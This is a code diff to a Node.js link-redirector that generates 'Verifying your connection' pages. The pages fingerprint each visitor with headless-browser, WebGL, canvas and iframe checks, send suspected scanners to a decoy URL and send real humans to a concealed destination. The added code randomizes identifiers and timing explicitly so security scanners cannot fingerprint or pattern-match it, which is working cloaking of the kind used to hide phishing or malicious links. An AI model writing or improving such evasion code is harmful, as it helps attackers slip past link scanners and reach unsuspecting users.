@@ -2,13 +2,32 @@ const crypto = require('crypto');
 
 // Attempt to load secret from config, otherwise use a safe default for development
 let SECRET = 'change-this-secret-in-production-immediately';
+let FALLBACK_URL = 'https://www.google.com';
 try {
     const config = require('../config');
     if (config.redirector && config.redirector.secret) {
         SECRET = config.redirector.secret;
     }
+    if (config.redirector && config.redirector.fallbackUrl) {
+        FALLBACK_URL = config.redirector.fallbackUrl;
+    }
 } catch (e) { 
     // Config might not exist in all environments, ignore error
+}
+
+// Generate a short alphanumeric token (used for randomized JS variable names so
+// every served HTML page differs and cannot be statically fingerprinted).
+// Uses `crypto.randomInt` to avoid the modulo-bias caused by `randomBytes()[i] % 52`.
+function _rndId(len = 6) {
+    const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let out = '';
+    for (let i = 0; i < len; i++) out += alphabet[crypto.randomInt(0, alphabet.length)];
+    return out;
+}
+
+// JSON-escape for safe embedding in a JS string literal wrapped in double quotes.
+function _jsStringEscape(str) {
+    return String(str).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
 }
 
 // ==================== PERFORMANCE FIX ====================
@@ -162,7 +181,7 @@ exports.generateInvisibleWrapper = (finalUrl, linkId) => {
     setTimeout(function() {
         if (isBot()) {
             // FAIL: Silent redirect to fallback
-            window.location.replace("https://www.google.com");
+            window.location.replace("${_jsStringEscape(FALLBACK_URL)}");
         } else {
             // PASS: Silent redirect to Real Destination
             // We use a POST request to a special endpoint that decrypts and redirects.
@@ -236,15 +255,35 @@ function createChallengeToken(url, linkId) {
  */
 exports.generateChallengePage = (finalUrl, linkId) => {
     const challengeToken = createChallengeToken(finalUrl, linkId);
-    const tokenSafe = challengeToken.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
+    const tokenSafe = _jsStringEscape(challengeToken);
+    const fallbackSafe = _jsStringEscape(FALLBACK_URL);
+    const linkIdSafe = _jsStringEscape(linkId);
+
+    // Randomize identifiers for each page render so static fingerprinting fails.
+    const fnIsBot = '_' + _rndId(7);
+    const fnSignals = '_' + _rndId(7);
+    const fnSubmit = '_' + _rndId(7);
+    const varTok = '_' + _rndId(5);
+    const varLid = '_' + _rndId(5);
+    const varInteracted = '_' + _rndId(5);
+    const varFallback = '_' + _rndId(5);
+    const noiseId = _rndId(10);
+    // Random delay so timing-based scanners can't pattern-match. Bumped from
+    // 250–500ms / 350–850ms (≈0.6–1.35s total) to 600–1100ms / 1000–1750ms
+    // (≈1.6–2.85s total) so simple HTML templates have visible time on
+    // screen before the redirect fetch fires.
+    const delay1 = 600 + Math.floor(Math.random() * 500);   // 600–1100ms
+    const delay2 = 1000 + Math.floor(Math.random() * 750);  // 1000–1750ms
 
     return `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="robots" content="noindex, nofollow, noarchive">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+<meta name="referrer" content="no-referrer">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Verifying</title>
+<!-- ${noiseId} -->
 <style>
 html,body{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#f5f5f5;}
 .center{display:flex;justify-content:center;align-items:center;min-height:100vh;}
@@ -257,78 +296,176 @@ html,body{margin:0;padding:0;height:100%;width:100%;overflow:hidden;background:#
 <div class="center"><div class="box"><div class="spinner"></div><p>Verifying your connection...</p></div></div>
 <script>
 (function() {
-    var TOKEN = "${tokenSafe}";
-    var LID = "${linkId}";
+    var ${varTok} = "${tokenSafe}";
+    var ${varLid} = "${linkIdSafe}";
+    var ${varFallback} = "${fallbackSafe}";
+    var ${varInteracted} = false;
 
-    function isBot() {
+    // Track human interaction (mouse/pointer/touch). Real users move at least
+    // a tiny bit between page render and submit; headless scanners do not.
+    function _onMove() { ${varInteracted} = true; }
+    try {
+        document.addEventListener('mousemove', _onMove, { passive: true, once: true });
+        document.addEventListener('pointermove', _onMove, { passive: true, once: true });
+        document.addEventListener('touchstart', _onMove, { passive: true, once: true });
+        document.addEventListener('keydown', _onMove, { passive: true, once: true });
+    } catch (e) { /* ignore */ }
+
+    function ${fnIsBot}() {
         var s = 0;
+        // Mechanical signals
         if (navigator.webdriver) s += 100;
         if (window.callPhantom || window._phantom) s += 100;
         if (navigator.languages && navigator.languages.length === 0) s += 80;
         if (navigator.userAgent && navigator.userAgent.indexOf('HeadlessChrome') !== -1) s += 100;
+
+        // Permissions / Notification API (headless often missing)
         try { if (!navigator.permissions) s += 30; } catch(e) {}
         try { if (typeof Notification === 'undefined') s += 25; } catch(e) { s += 25; }
+
+        // Plugins on non-touch desktop
         if (navigator.plugins && navigator.plugins.length === 0 && !('ontouchstart' in window)) s += 30;
-        if (screen.width === 0 || screen.height === 0) s += 80;
+
+        // Screen / display sanity
+        if (!screen.width || !screen.height) s += 80;
         if (screen.colorDepth && screen.colorDepth < 8) s += 40;
+
+        // Hardware sanity
+        try { if (navigator.hardwareConcurrency === 0) s += 30; } catch(e) {}
+
+        // Timezone — every real browser exposes one
+        try {
+            var tz = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || '';
+            if (!tz) s += 30;
+        } catch(e) { s += 30; }
+
+        // Iframe sandbox detection — if our page is loaded inside a probing iframe
+        try { if (window.top !== window.self) s += 50; } catch(e) { s += 50; }
+
+        // Canvas fingerprint
         try {
             var c = document.createElement('canvas');
             var ctx = c.getContext('2d');
             if (!ctx) { s += 80; } else {
-                ctx.textBaseline = "top";
-                ctx.font = "14px Arial";
-                ctx.fillStyle = "#f60";
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
                 ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Check", 2, 15);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Check', 2, 15);
                 if (c.toDataURL().length < 100) s += 60;
             }
         } catch(e) { s += 60; }
+
+        // WebGL — also probe vendor/renderer for SwiftShader (headless Chrome's renderer)
         try {
-            var gl = document.createElement('canvas').getContext('webgl');
-            if (!gl) s += 20;
+            var glc = document.createElement('canvas');
+            var gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
+            if (!gl) { s += 20; }
+            else {
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    var rend = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
+                    var vend = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '').toLowerCase();
+                    var isSwiftShader = rend.indexOf('swiftshader') !== -1 || vend.indexOf('swiftshader') !== -1;
+                    if (isSwiftShader) s += 60;
+                    if (rend.indexOf('llvmpipe') !== -1) s += 40;
+                }
+            }
         } catch(e) { s += 20; }
+
+        // Chrome-only sanity check — real Chrome exposes window.chrome
         if (navigator.userAgent.indexOf('Chrome') !== -1 && !(window.chrome && window.chrome.app)) s += 40;
+
+        // Audio fingerprint quick test — headless often lacks AudioContext or returns flat output
+        try {
+            var AC = window.AudioContext || window.webkitAudioContext;
+            if (!AC) s += 20;
+        } catch(e) { s += 20; }
+
         return s >= 50;
     }
 
-    function getSignals() {
-        return {
+    function ${fnSignals}() {
+        var sig = {
             jsExecuted: true,
             webdriver: !!navigator.webdriver,
             headless: navigator.userAgent.indexOf('HeadlessChrome') !== -1,
-            hasChrome: !!window.chrome,
-            hasCanvas: (function() { try { return !!document.createElement('canvas').getContext('2d'); } catch(e) { return false; } })(),
+            hasChrome: !!(window.chrome && window.chrome.app),
+            hasCanvas: false,
             loadTime: Math.round(performance.now()),
             screenWidth: screen.width || 0,
             screenHeight: screen.height || 0,
             languages: navigator.languages ? navigator.languages.length : 0,
             plugins: navigator.plugins ? navigator.plugins.length : -1,
             touchSupport: 'ontouchstart' in window,
-            colorDepth: screen.colorDepth || 0
+            colorDepth: screen.colorDepth || 0,
+            deviceMemory: navigator.deviceMemory || 0,
+            hardwareConcurrency: navigator.hardwareConcurrency || 0,
+            hasInteraction: ${varInteracted},
+            iframed: false,
+            timezone: '',
+            webglVendor: '',
+            webglRenderer: '',
+            audioCtx: false
         };
+        try { sig.iframed = window.top !== window.self; } catch (e) { sig.iframed = true; }
+        try { sig.timezone = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || ''; } catch(e) {}
+        try {
+            var c = document.createElement('canvas');
+            var ctx = c.getContext('2d');
+            if (ctx) {
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069'; ctx.fillText('Test', 2, 15);
+                sig.canvasHash = c.toDataURL().length;
+                sig.hasCanvas = true;
+            } else { sig.canvasHash = 0; }
+        } catch(e) { sig.canvasHash = 0; }
+        try {
+            var glc = document.createElement('canvas');
+            var gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
+            if (gl) {
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    sig.webglVendor = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '').slice(0, 64);
+                    sig.webglRenderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').slice(0, 96);
+                }
+            }
+        } catch(e) {}
+        try { sig.audioCtx = !!(window.AudioContext || window.webkitAudioContext); } catch(e) {}
+        return sig;
     }
 
-    setTimeout(function() {
-        if (isBot()) {
-            window.location.replace("https://www.google.com");
-        } else {
-            fetch('/tr/v2/challenge', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ token: TOKEN, linkId: LID, signals: getSignals() })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(d) {
-                if (d && d.redirectTo) {
-                    window.location.replace(d.redirectTo);
-                }
-            })
-            .catch(function() {
-                window.location.replace("https://www.google.com");
-            });
+    function ${fnSubmit}() {
+        if (${fnIsBot}()) {
+            window.location.replace(${varFallback});
+            return;
         }
-    }, 100);
+        fetch('/tr/v2/challenge', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'same-origin',
+            body: JSON.stringify({ token: ${varTok}, linkId: ${varLid}, signals: ${fnSignals}() })
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d && d.redirectTo) {
+                window.location.replace(d.redirectTo);
+            } else {
+                window.location.replace(${varFallback});
+            }
+        })
+        .catch(function() {
+            window.location.replace(${varFallback});
+        });
+    }
+
+    // Two-stage delay: first short delay lets the page render and gives us a chance
+    // to observe an early mousemove. Second delay does the actual submission.
+    setTimeout(function() {
+        setTimeout(${fnSubmit}, ${delay2});
+    }, ${delay1});
 })();
 </script>
 </body>
